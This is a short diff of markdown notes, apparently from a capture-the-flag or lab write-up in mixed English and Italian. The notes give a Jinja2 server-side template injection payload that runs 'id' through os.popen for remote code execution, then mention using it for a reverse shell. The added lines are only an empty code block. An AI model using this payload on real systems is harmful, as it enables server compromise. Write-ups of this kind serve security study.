@@ -32,5 +32,8 @@ Use the "user=" parameter to inject the ssti payload and achieve a RCE
 {{request.application.__globals__.__builtins__.__import__('os').popen("id").read()}}
 ```
 Usa il payload url encodato
+```
+
+```
 ![[Pasted image 20231011155050.png]]
 Now use the rce to obtain a reverse shell
